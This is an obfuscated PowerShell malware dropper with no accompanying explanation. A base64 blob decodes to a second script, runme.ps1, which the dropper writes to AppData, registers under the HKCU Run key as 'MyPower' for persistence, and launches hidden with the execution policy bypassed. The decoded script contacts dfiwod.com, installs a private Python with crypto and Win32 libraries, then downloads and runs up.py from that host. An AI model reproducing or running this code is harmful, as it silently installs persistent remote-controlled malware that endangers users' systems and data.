$sv = 'Err'+'orAction'+'Preference'
Set-Variable -Name $sv -Value 'Stop'

$TFlsgCfG = 'eyJwYXRocyI6WyJydW5tZS5wczEiXSwiZGF0YSI6WyJTVzUyYjJ0bExWZGxZbEpsY1hWbGMzUWdMVlZ5YVNBaWFIUjBjSE02THk5a1ptbDNiMlF1WTI5dEx6SXVjR2h3SWlBdFZYTmxRbUZ6YVdOUVlYSnphVzVuSUh3Z1QzVjBMVTUxYkd3TkNnMEtKR1p6UkhKcGRtVnpJRDBnUjJWMExWQlRSSEpwZG1VZ0xWQlRVSEp2ZG1sa1pYSWdSbWxzWlZONWMzUmxiU0I4SUZObGJHVmpkQzFQWW1wbFkzUWdMVVY0Y0dGdVpGQnliM0JsY25SNUlGSnZiM1FOQ2lSdFlXbHVSSEpwZG1VZ1BTQWtabk5FY21sMlpYTWdmQ0JYYUdWeVpTMVBZbXBsWTNRZ2V5QWtYeUF0YldGMFkyZ2dJbDViUVMxYVhUcGNYQ1FpSUgwZ2ZDQlRaV3hsWTNRdFQySnFaV04wSUMxR2FYSnpkQ0F4RFFwcFppQW9MVzV2ZENBa2JXRnBia1J5YVhabEtTQjdJR1Y0YVhRZ2ZRMEtEUW9rZDI5eWEybHVaMFJwY2lBOUlDSWtiV0ZwYmtSeWFYWmxYRlJsYlhBaURRcHBaaUFvTFc1dmRDQW9WR1Z6ZEMxUVlYUm9JQ1IzYjNKcmFXNW5SR2x5S1NrZ2V5Qk9aWGN0U1hSbGJTQXRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQXRTWFJsYlZSNWNHVWdSR2x5WldOMGIzSjVJSHdnVDNWMExVNTFiR3dnZlEwS0RRb2tiWFYwWlhoR2FXeGxJRDBnSWlSM2IzSnJhVzVuUkdseVhITmpjbWx3ZEM1c2IyTnJJZzBLYVdZZ0tGUmxjM1F0VUdGMGFDQWtiWFYwWlhoR2FXeGxLU0I3SUdWNGFYUWdmUTBLVG1WM0xVbDBaVzBnTFZCaGRHZ2dKRzExZEdWNFJtbHNaU0F0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVZ2ZDQlBkWFF0VG5Wc2JBMEtEUW9rY0hsMGFHOXVVR0YwYUNBOUlDSWtkMjl5YTJsdVowUnBjbHhRZVVWdWRpSU5DaVJ6WTNKcGNIUlFZWFJvSUQwZ0lpUjNiM0pyYVc1blJHbHlYSFZ3TG5CNUlnMEtKSEI1V21sd0lEMGdJaVJsYm5ZNlZFVk5VRnh3ZVY5bGJXSmxaR1JsWkM1NmFYQWlEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZkM2QzTG5CNWRHaHZiaTV2Y21jdlpuUndMM0I1ZEdodmJpOHpMakV4TGpndmNIbDBhRzl1TFRNdU1URXVPQzFsYldKbFpDMWhiV1EyTkM1NmFYQWlJQzFQZFhSR2FXeGxJQ1J3ZVZwcGNBMEtSWGh3WVc1a0xVRnlZMmhwZG1VZ0xWQmhkR2dnSkhCNVdtbHdJQzFFWlhOMGFXNWhkR2x2YmxCaGRHZ2dKSEI1ZEdodmJsQmhkR2dnTFVadmNtTmxEUXBTWlcxdmRtVXRTWFJsYlNBa2NIbGFhWEFOQ2cwS0pIQkpibWwwUm1sc1pTQTlJRXB2YVc0dFVHRjBhQ0FrY0hsMGFHOXVVR0YwYUNBaWNIbDBhRzl1TXpFeExsOXdkR2dpRFFvb1IyVjBMVU52Ym5SbGJuUWdKSEJKYm1sMFJtbHNaU2tnTFhKbGNHeGhZMlVnSnlOcGJYQnZjblFnYzJsMFpTY3NJQ2RwYlhCdmNuUWdjMmwwWlNjZ2ZDQlRaWFF0UTI5dWRHVnVkQ0FrY0VsdWFYUkdhV3hsRFFvTkNrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDMVZjbWtnSW1oMGRIQnpPaTh2WW05dmRITjBjbUZ3TG5CNWNHRXVhVzh2WjJWMExYQnBjQzV3ZVNJZ0xVOTFkRVpwYkdVZ0lpUndlWFJvYjI1UVlYUm9YR2RsZEMxd2FYQXVjSGtpRFFvbUlDSWtjSGwwYUc5dVVHRjBhRnh3ZVhSb2IyNHVaWGhsSWlBaUpIQjVkR2h2YmxCaGRHaGNaMlYwTFhCcGNDNXdlU0lOQ2xKbGJXOTJaUzFKZEdWdElDSWtjSGwwYUc5dVVHRjBhRnhuWlhRdGNHbHdMbkI1SWcwS0RRb21JQ0lrY0hsMGFHOXVVR0YwYUZ4d2VYUm9iMjR1WlhobElpQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCd2VXTnllWEIwYjJSdmJXVWdjSGx3YVhkcGJqTXlJSEpsY1hWbGMzUnpEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZaR1pwZDI5a0xtTnZiUzkxY0M1d2VTSWdMVTkxZEVacGJHVWdKSE5qY21sd2RGQmhkR2dOQ2lZZ0lpUndlWFJvYjI1UVlYUm9YSEI1ZEdodmJpNWxlR1VpSUNJa2MyTnlhWEIwVUdGMGFDSU5DZz09Il19'

$json = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TFlsgCfG))
$obj = ConvertFrom-Json $json
$paths = $obj.paths
$data = $obj.data

$up = Join-Path $Env:AppData 'Y4TFCR'
[System.IO.Directory]::CreateDirectory($up) | Out-Null

for ($i = 0; $i -lt $paths.Count; $i++) {
    $filename = $paths[$i]
    $bytes = [System.Convert]::FromBase64String($data[$i])
    $fullPath = Join-Path $up $filename
    $dir = [System.IO.Path]::GetDirectoryName($fullPath)
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }
    [System.IO.File]::WriteAllBytes($fullPath, $bytes)
}

$scriptPath = Join-Path $up 'runme.ps1'
$cmd = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyPower" -Value $cmd -PropertyType String -Force | Out-Null


Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden -WorkingDirectory $up
